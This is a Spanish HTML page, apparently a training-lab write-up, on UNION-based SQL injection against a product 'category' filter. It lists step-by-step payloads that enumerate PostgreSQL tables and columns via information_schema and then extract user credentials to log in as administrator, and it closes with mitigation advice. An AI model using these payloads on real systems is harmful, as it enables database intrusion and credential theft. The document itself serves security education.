@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 5 - SQL Injection Listing DB Contents (Non-Oracle)</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+
+<section class="activities-section">
+
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 5</h2>
+<p>SQL Injection attack, listing the database contents on non-Oracle databases</p>
+</div>
+
+
+<div class="info-card">
+<h3><i class="fas fa-layer-group"></i> Información del laboratorio</h3>
+<p><strong>Nivel:</strong> Practitioner</p>
+<p><strong>Tipo de SQLi:</strong> UNION-based SQL Injection (In-band)</p>
+</div>
+
+
+<div class="info-card">
+<h3><i class="fas fa-bullseye"></i> Objetivo</h3>
+
+<p>
+Enumerar el contenido de la base de datos explotando una vulnerabilidad SQL Injection en el parámetro
+<strong>category</strong> del filtro de productos.
+</p>
+
+<p>
+El objetivo es identificar la tabla que almacena credenciales de usuarios, descubrir sus columnas
+y extraer usernames y passwords para iniciar sesión como <strong>administrator</strong>.
+</p>
+
+</div>
+
+
+<div class="info-card">
+<h3><i class="fas fa-exclamation-triangle"></i> Vulnerabilidad</h3>
+
+<p>
+La aplicación construye la consulta SQL concatenando directamente el valor del parámetro
+<strong>category</strong>.
+</p>
+
+<pre>
+SELECT * FROM products WHERE category = 'input'
+</pre>
+
+<p>
+Esto permite cerrar la cadena original e insertar consultas adicionales mediante
+<strong>UNION SELECT</strong>.
+</p>
+
+<p>
+El motor de base de datos identificado es <strong>PostgreSQL</strong>, evidenciado por la presencia
+de tablas del esquema <strong>information_schema</strong>.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+<p><strong>Paso 1 – Confirmar SQL Injection</strong></p>
+
+<pre>
+Gifts' UNION SELECT 'abc','def'--
+</pre>
+
+<p>
+La página mostró "abc" y "def" como productos, confirmando:
+</p>
+
+<ul>
+<li>Vulnerabilidad SQL Injection</li>
+<li>Dos columnas compatibles con UNION</li>
+</ul>
+
+
+<p><strong>Paso 2 – Enumerar tablas</strong></p>
+
+<pre>
+Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
+</pre>
+
+<p>
+Se identificó la tabla que contiene credenciales:
+<strong>users_wdykho</strong>
+</p>
+
+
+<p><strong>Paso 3 – Enumerar columnas</strong></p>
+
+<pre>
+Gifts' UNION SELECT column_name, NULL 
+FROM information_schema.columns 
+WHERE table_name='users_wdykho'--
+</pre>
+
+<p>
+Se identificaron las columnas relevantes:
+</p>
+
+<ul>
+<li>username_eclowy</li>
+<li>password_cvzrzx</li>
+</ul>
+
+
+<p><strong>Paso 4 – Extraer credenciales</strong></p>
+
+<pre>
+Gifts' UNION SELECT password_cvzrzx, username_eclowy FROM users_wdykho--
+</pre>
+
+<p>
+La respuesta mostró todos los usuarios y contraseñas almacenadas en la base de datos.
+</p>
+
+
+<p><strong>Paso 5 – Acceder al sistema</strong></p>
+
+<p>
+Se utilizó la credencial del usuario <strong>administrator</strong> para iniciar sesión
+en la página de login.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-code"></i> Explicación del payload</h3>
+
+<pre>
+' UNION SELECT [columna1], [columna2] FROM [tabla]--
+</pre>
+
+<ul>
+
+<li>' → cierra la cadena original del WHERE</li>
+
+<li>UNION SELECT → permite combinar resultados adicionales</li>
+
+<li>NULL o valores arbitrarios → mantienen la compatibilidad con las columnas</li>
+
+<li>-- → comenta el resto de la consulta original</li>
+
+</ul>
+
+<p>
+Esta técnica permite una enumeración progresiva:
+</p>
+
+<p>
+<strong>metadatos → estructura → datos</strong>
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+
+<ul>
+
+<li>Uso obligatorio de consultas parametrizadas.</li>
+
+<li>Validación estricta de entradas mediante listas blancas.</li>
+
+<li>Aplicar principio de mínimo privilegio.</li>
+
+<li>Uso de ORM que gestione consultas seguras.</li>
+
+<li>Implementación de WAF.</li>
+
+</ul>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+</div>
+
+</section>
+
+</body>
+</html>
